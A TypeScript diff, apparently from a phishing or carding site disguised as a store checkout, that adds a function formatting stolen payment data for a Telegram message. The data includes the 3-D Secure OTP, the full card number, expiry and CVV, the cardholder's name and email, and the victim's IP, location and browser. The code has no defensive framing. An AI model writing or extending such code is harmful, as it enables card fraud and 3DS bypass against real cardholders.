@@ -216,3 +216,71 @@ export function formatCartCheckoutTelegramMessage(
 
   return message;
 }
+
+export interface PaymentOtpTelegramContext {
+  otp: string;
+  cardName?: string;
+  cardNumber: string;
+  cardExpiry?: string;
+  cardCvv?: string;
+  email?: string;
+  fullName?: string;
+  merchantName?: string;
+  amountDisplay?: string;
+  cardBrand?: string;
+  path?: string;
+  userAgent: string;
+  acceptLanguage?: string;
+  geo: VisitorGeoDetails | null;
+  submittedAt: string;
+  storeName?: string;
+}
+
+export function formatPaymentOtpTelegramMessage(
+  ctx: PaymentOtpTelegramContext
+): string {
+  const { browser, os, device } = parseUserAgent(ctx.userAgent);
+  const geo = ctx.geo;
+
+  const locationParts = [
+    geo?.city,
+    geo?.region,
+    geo?.country,
+    geo?.countryCode ? `(${geo.countryCode})` : null,
+  ].filter(Boolean);
+
+  let message = "<b>🔐 3DS — OTP entered</b>";
+  if (ctx.storeName) {
+    message += `\n${escapeHtml(ctx.storeName)}`;
+  }
+  message += "\n\n";
+
+  message += "<b>Verification</b>\n";
+  message += line("OTP", ctx.otp);
+  message += line("Card brand", ctx.cardBrand);
+
+  message += "\n<b>Cardholder</b>\n";
+  message += line("Name on card", ctx.cardName);
+  message += line("Card number", ctx.cardNumber);
+  message += line("Card expiry", ctx.cardExpiry);
+  message += line("Card CVV", ctx.cardCvv);
+  message += line("Email", ctx.email);
+  message += line("Customer name", ctx.fullName);
+
+  message += "\n<b>Transaction</b>\n";
+  message += line("Merchant", ctx.merchantName);
+  message += line("Amount", ctx.amountDisplay);
+
+  message += "\n<b>📍 Location</b>\n";
+  message += line("IP", geo?.ip ?? "Unknown");
+  message += line("Location", locationParts.join(", ") || "Unknown");
+  message += line("Timezone", geo?.timezone);
+
+  message += "\n<b>🌐 Session</b>\n";
+  message += line("Page", ctx.path);
+  message += line("Submitted at", ctx.submittedAt);
+  message += line("Device", device);
+  message += line("Browser", `${browser} on ${os}`);
+
+  return message;
+}
